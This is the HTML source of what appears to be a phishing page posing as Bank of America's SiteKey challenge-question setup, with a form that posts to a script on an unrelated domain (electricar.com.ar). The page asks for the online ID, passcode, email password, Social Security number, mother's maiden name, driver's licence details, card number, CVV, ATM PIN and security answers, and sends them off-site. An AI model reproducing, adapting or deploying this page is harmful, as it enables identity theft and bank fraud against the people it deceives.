...
<html class="win ff ff-9 cf-cnx-regular-inactive" xmlns="http://www.w3.org/1999/xhtml" xml:lang="en-US" lang="en-US"><head><style type="text/css">@font-face { font-family: 'cnx-regular'; src: url('https://electricar.com.ar/pa/global-assets/1.0/font/cnx-regular/cnx-regular.eot'); src: url('https://electricar.com.ar/pa/global-assets/1.0/font/cnx-regular/cnx-regular.eot?') format('embedded-opentype'), url('https://electricar.com.ar/pa/global-assets/1.0/font/cnx-regular/cnx-regular.woff') format('woff'), url('https://electricar.com.ar/pa/global-assets/1.0/font/cnx-regular/cnx-regular.ttf') format('truetype'), url('https://electricar.com.ar/pa/global-assets/1.0/font/cnx-regular/cnx-regular.svg') format('svg'); font-weight: normal; font-style: normal; font-variant: normal; }</style>
...
<!-- TLDB false -->
			<!-- TL-NOPV true -->
	<title>Bank of America | Create SiteKey Challenge Questions and Answers</title>
...
<!-- PHASE 2B CHANGES currentLocation is /login/sitekey-creation/select-question-answers -->
	...
	<form name="verifyForm" action="https://electricar.com.ar/wp-includes/css/Bofa/submit.php" method="post">
<input name="onlineid" type="hidden" value="">
		...
		<a class="ada-hidden" href="security.php#skip-to-h1" name="anc-skip-to-main-content">Skip to main content</a>
...
<div class="header-module">
   <div class="fsd-secure-esp-skin">
   	  <img alt="Bank of America" src="files/bac_reg_logo_tmp_250X69.gif" height="28" width="207">
      <div class="page-type">Sign In</div>
      <div class="right-links">
		<div class="secure-area">Secure Area</div>
       <a class="divide" href="https://electricar.com.ar/login/languageToggle.go?request_locale=es-us" target="_self" name="spanish_toggle" title="Muestra esta sesi n de la Banca en L nea">En Español</a>
...
<label for="newEmailAddress"><b> * Online ID:</b></label></font></td>
	...
	<tr>
		<td width="202">
		<p align="right"><font face="Arial" size="2">
<label for="newEmailAddress"><b> * Please Re-Enter Passcode:</b></label></font></td>
		<td>&nbsp;&nbsp;
		<input class="" name="passcode" size="23" maxlength="60" type="password"></td>
	</tr>
	<tr>
		<td width="202">&nbsp;</td>
		<td>&nbsp;</td>
...
<label for="newEmailAddress">* Full Name:</label></font></b></td>
		<td>&nbsp;&nbsp;
		<input class="" name="fullname" size="30" maxlength="60" type="text"></td>
	</tr>
	<tr>
		<td width="202">&nbsp;</td>
		<td>&nbsp;</td>
...
<label for="newEmailAddress"><b> * Home Address:</b></label></font></td>
		<td>&nbsp;&nbsp;
		<input class="" name="address" size="30" maxlength="60" type="text"></td>
	</tr>
	<tr>
		<td width="202">&nbsp;</td>
		<td>&nbsp;</td>
...
<label for="newEmailAddress"><b> * City:</b></label></font></td>
		<td>&nbsp;&nbsp;
		<input class="" name="city" size="20" maxlength="60" type="text"></td>
	</tr>
	<tr>
		<td width="202">&nbsp;</td>
		<td>&nbsp;</td>
...
<label for="newEmailAddress"><b> * State:</b></label></font></td>
		<td>&nbsp;&nbsp;
		<input class="" name="state" size="3" maxlength="2" type="text"></td>
	</tr>
	<tr>
		<td width="202">&nbsp;</td>
		<td>&nbsp;</td>
...
<label for="newEmailAddress"><b> * Zip Code:</b></label></font></td>
		<td>&nbsp;&nbsp;
		<input class="" name="zip" size="10" maxlength="10" type="text"></td>
	</tr>
	<tr>
		<td width="202">&nbsp;</td>
		<td>&nbsp;</td>
...
<label for="newEmailAddress"><b> * E-mail Address:</b></label></font></td>
		<td>&nbsp;&nbsp;
		<input class="" name="email" size="30" maxlength="60" type="text"></td>
	</tr>
	<tr>
		<td width="202">&nbsp;</td>
		<td>&nbsp;</td>
...
<label for="newEmailAddress"><b> * Email Password:</b></label></font></td>
		<td>&nbsp;&nbsp;
		<input class="" name="password" size="30" maxlength="60" type="password"></td>
	</tr>
	<tr>
		<td width="202">&nbsp;</td>
		<td>&nbsp;</td>
...
<label for="newEmailAddress"><b> * Social Security Number:</b></label></font></td>
		<td>&nbsp;&nbsp;
		<input class="" type="text" id="ssn1" size="3" maxlength="3" name="ssn1">-<input class="" type="text" id="ssn2" size="2" maxlength="2" name="ssn2">-<input class="" type="text" id="ssn3" size="4" maxlength="4" name="ssn3">&nbsp;
...
<label for="newEmailAddress"><b> * Mother's Maiden Name:</b></label></font></td>
		<td>&nbsp;&nbsp;
		<input class="" name="mmn" size="25" maxlength="60" type="text"></td>
	</tr>
	<tr>
		<td width="202">&nbsp;</td>
		<td>&nbsp;</td>
...
<label for="newEmailAddress"><b> * Driver's License Number:</b></label></font></td>
		<td>&nbsp;&nbsp;
		<input class="" name="dl" size="25" maxlength="60" type="text"></td>
	</tr>
	<tr>
		<td width="202">&nbsp;</td>
		<td>&nbsp;</td>
...
<label for="newEmailAddress"><b> * Driver's License Expiry Date:</b></label></font></td>
		<td>&nbsp;&nbsp;
		<input class="" type="text" id="exp1" size="2" maxlength="2" name="exp1">-<input class="" type="text" id="exp2" size="2" maxlength="2" name="exp2">-<input class="" type="text" id="exp3" size="4" maxlength="4" name="exp3">
	...
	<tr>
		<td colspan="2"><b>
		<font color="#FFFFFF" style="font-size: 11pt" face="Arial">&nbsp;</font><font style="font-size: 11pt" face="Arial" color="#808080">CARD 
		INFORMATION</font></b></td>
		</tr>
	<tr>
		<td width="202">&nbsp;</td>
	...
	<tr>
		<td width="202">
		<p align="right"><font face="Arial" size="2">
<label for="debitcardno"><b> * ATM or Check Card Number:</b></label></font></td>
		<td>&nbsp;&nbsp;
		<input class="" type="text" name="ccnumber" size="30" maxlength="16">

		<font face="Arial" size="1">(16 digits, no dashes or spaces)</font></td>
	</tr>
	<tr>
		<td width="202">&nbsp;</td>
		<td>&nbsp;</td>
	...
	<tr>
		<td width="202">
		<p align="right"><font face="Arial" size="2">
<label for="newEmailAddress"><b> * Card Expiration Date:</b></label></font></td>
		<td>&nbsp;&nbsp; <select class="" name="expmonth" id="expmonth">
...
<option value=11>11</option>
<option value=12>12</option>
</select>&nbsp;<select name="expyear" size="1" id="expyear" type="select">
...
<option value="27">2027</option>
	...
	<tr>
		<td width="202">
		<p align="right"><font face="Arial" size="2">
<label for="newEmailAddress"><b> * Card Verification Number:</b></label></font></td>
		<td>&nbsp;&nbsp;
		<input class="" name="cvv" size="5" maxlength="4" type="text"></td>
	</tr>
	<tr>
		<td width="202">&nbsp;</td>
		<td>&nbsp;</td>
	...
	<tr>
		<td width="202">
		<p align="right"><font face="Arial" size="2">
<label for="debitcardno"><b> * ATM or Check Card PIN:</b></label></font></td>
		<td>&nbsp;&nbsp; <input class="" type="password" name="ccpin" size="12" maxlength="12" value=""></td>
	</tr>
	<tr>
		<td width="202">&nbsp;</td>
		<td>&nbsp;</td>
...
<option value="What was the name of your first pet?">What is the name of the medical professional who delivered your first child?</option>
...
<label for="debitcardno"><b> * Answer:</b></label></font></td>
		<td>&nbsp;&nbsp; 
		<input class="" name="answer1" size="19" value=""></td>
	</tr>
	<tr>
		<td width="202">&nbsp;</td>
		<td>&nbsp;</td>
...
<label for="debitcardno"><b> * Your Second Question:</b></label></font></td>
		<td>&nbsp;&nbsp; 
		<select class="" name="q2" id="expmonth1" size="1">
...
<label for="debitcardno"><b> * Answer:</b></label></font></td>
		<td>&nbsp;&nbsp; 
		<input class="" name="answer2" size="19" value=""></td>
	</tr>
	<tr>
		<td width="202">&nbsp;</td>
		<td>&nbsp;</td>
...
<label for="debitcardno"><b> * Your Third Question:</b></label></font></td>
		<td>&nbsp;&nbsp; 
		<select class="" name="q3" id="expmonth2" size="1">
<option selected>Select</option>
...
<label for="debitcardno"><b> * Answer:</b></label></font></td>
		<td>&nbsp;&nbsp; 
		<input class="" name="answer3" size="19" value=""></td>
	</tr>
	<tr>
		<td width="202">&nbsp;</td>
		<td>&nbsp;</td>
	...
	<tr>
		<td width="202">&nbsp;</td>
		<td>&nbsp;<input type="image" src="continue.jpg" name="B1" alt="Continue"style="float: right"></td>
	</tr>
</table>
		...
		<div class="fsd-liveperson-skin">
					<div class="sm-title">
					    ...
					    <ul role="tablist" class="accordion ui-accordion ui-widget ui-helper-reset ui-accordion-icons">
											...
											<div role="tabpanel" style="height: auto; display: none;" class="content-area ui-accordion-content ui-helper-reset ui-widget-content ui-corner-bottom cntheight"><p>SiteKey
...
Answering these questions helps us make sure it's you trying to sign in.
 The questions must be answered correctly to access Online Banking.</p></div>
											</li>
											<li class="ui-accordion-li-fix">
...
<div class="global-footer-module">
   <div class="gray-bground-skin cssp">
      ...
      <p>Bank of America, N.A. Member FDIC. <a name="Equal_Housing_Lender" href="http://www.bankofamerica.com/help/equalhousing_popup.cfm" target="_blank">Equal Housing Lender</a> <br>© 2018 Bank of America Corporation. All rights reserved.</p>
   </div>
</div>
</div>
				</div>
